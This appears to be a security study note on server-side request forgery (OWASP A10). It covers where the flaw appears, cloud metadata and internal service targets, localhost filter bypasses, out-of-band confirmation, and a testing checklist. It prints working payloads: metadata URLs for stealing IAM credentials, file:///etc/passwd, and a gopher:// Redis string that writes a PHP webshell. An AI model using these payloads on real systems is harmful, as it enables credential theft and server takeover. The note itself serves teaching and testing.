# A10 — Server-Side Request Forgery (SSRF)

← [[OWASP-Overview]]

---

SSRF is when you trick a server into making HTTP requests on your behalf — to internal services, cloud metadata endpoints, or other resources the server can reach but you can't.

It was added to the OWASP Top 10 in 2021 specifically because of cloud environments. In a cloud deployment, SSRF → cloud metadata endpoint → IAM credentials → full account takeover.

---

## The Core Idea

```
You → Server → Internal Resource

Instead of:
You → Internal Resource (blocked)
```

The server is making requests based on your input. You control where it points.

---

## Where SSRF Appears

Any feature that makes server-side HTTP requests based on user input:

- **URL preview / link unfurling** — "paste a URL and we'll show you a preview"
- **Webhooks** — "enter a URL and we'll send events there"
- **File import from URL** — "import your profile picture from a URL"
- **PDF/screenshot generation** — "enter a URL and we'll render it as PDF"
- **XML/SVG processing** — external entity resolution
- **Server-side analytics** — sending data to a specified endpoint
- **API integrations** — fetching data from a URL you provide

---

## What You Can Hit

### Cloud Metadata (Highest Impact)

```
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
GCP:   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01
```

Successful hit → IAM credentials → lateral movement through cloud infrastructure.

### Internal Services

```
http://127.0.0.1:6379/      ← Redis (no auth common)
http://127.0.0.1:9200/      ← Elasticsearch
http://127.0.0.1:8080/      ← Internal web app
http://192.168.1.1/         ← Internal network
http://10.0.0.1/admin       ← Internal admin panel
```

### Localhost Bypasses

See [[SSRF-Bypass]] cheatsheet for the full list. Common bypasses:
```
http://127.1/
http://0/
http://[::1]/
http://2130706433/   (decimal for 127.0.0.1)
http://0x7f000001/   (hex)
```

---

## Blind SSRF

Sometimes you don't see the response from the internal request. You can still confirm SSRF with out-of-band techniques:

```bash
# Use Burp Collaborator or interactsh
https://your-id.oastify.com

# Use a requestbin or webhook.site URL
https://webhook.site/unique-id

# Or host your own listener
python3 -m http.server 8080
# Then use ngrok or similar to expose it
```

If the server makes a request to your callback URL, SSRF is confirmed even without seeing the response.

---

## SSRF to RCE

In the right environment, SSRF chains into full RCE:

1. **SSRF → Redis RCE**
   ```
   gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20key%20"<?php system($_GET['cmd']); ?>"...
   ```
   Redis with no auth + SSRF using `gopher://` protocol = write PHP webshell

2. **SSRF → AWS metadata → IAM key → S3/Lambda/EC2**
   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
   → AccessKeyId + SecretAccessKey + Token
   → aws s3 ls --profile stolen
   → aws lambda list-functions --profile stolen
   ```

3. **SSRF → Internal admin panel → RCE feature**

---

## Testing for SSRF

```bash
# 1. Find parameters that accept URLs
# Look for: url=, endpoint=, path=, dest=, redirect=, uri=, src=, href=, link=

# 2. Try your callback server
url=https://your-collaborator-url.com

# 3. Try internal addresses
url=http://127.0.0.1/
url=http://169.254.169.254/latest/meta-data/

# 4. If filtered, use bypasses (see cheatsheet)
url=http://127.1/
url=http://2130706433/

# 5. Try non-HTTP schemes
url=file:///etc/passwd
url=dict://127.0.0.1:6379/info
url=gopher://127.0.0.1:6379/_INFO
```

---

## Protocol Handlers

| Scheme | Effect |
|--------|--------|
| `http://` `https://` | Standard HTTP request |
| `file://` | Read local files |
| `dict://` | Dictionary protocol — probe services |
| `gopher://` | Send raw TCP data — most powerful for internal service exploitation |
| `ftp://` | FTP requests |
| `ldap://` | LDAP queries |

---

## Full Deep Dive

[[SSRF-Overview]] — extended testing methodology and exploitation
[[SSRF-Bypass-Techniques]] — complete bypass reference
[[SSRF-Bypass]] cheatsheet — quick payload reference

---

*Related: [[SSRF-Overview]] | [[A05-Security-Misconfiguration]] | [[OWASP-Overview]]*

*Sources: OWASP Top 10 2021, PortSwigger Web Security Academy, HowToHunt*
